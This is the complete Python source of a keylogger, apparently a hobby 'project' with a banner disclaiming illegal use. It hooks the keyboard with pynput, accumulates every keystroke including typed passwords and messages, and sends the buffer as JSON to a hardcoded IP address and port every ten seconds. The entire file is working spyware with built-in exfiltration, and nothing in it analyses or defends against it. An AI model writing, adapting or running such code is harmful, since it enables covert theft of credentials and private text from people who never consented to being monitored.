"""
----------------------------------------------------
This project is owned by Zephyr!
Never use it for illegal actions!!
* Armagedon 2024
----------------------------------------------------
"""

from pynput import keyboard
import requests
import json
import threading

# Variable to store keystrokes
keystrokes = ""

# Server IP address and port number
server_ip = "192.168.43.121"
server_port = "8080"

# Time interval for sending data
send_interval = 10

def send_data_to_server():
    """
    Sends the collected keystrokes to the server at regular intervals.
    """
    try:
        payload = json.dumps({"keyboardData": keystrokes})
        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
        
        # Set up the next call to this function
        timer = threading.Timer(send_interval, send_data_to_server)
        timer.start()
    except:
        print("Couldn't complete request!")

def handle_key_press(key):
    """
    Handles the key press events and updates the keystrokes variable.
    """
    global keystrokes

    if key == keyboard.Key.enter:
        keystrokes += "\n"
    elif key == keyboard.Key.tab:
        keystrokes += "\t"
    elif key == keyboard.Key.space:
        keystrokes += " "
    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
        pass
    elif key == keyboard.Key.backspace:
        if len(keystrokes) > 0:
            keystrokes = keystrokes[:-1]
    elif key == keyboard.Key.esc:
        return False
    else:
        keystrokes += str(key).strip("'")

# Start the keyboard listener and initiate sending data to the server
with keyboard.Listener(on_press=handle_key_press) as listener:
    send_data_to_server()
    listener.join()
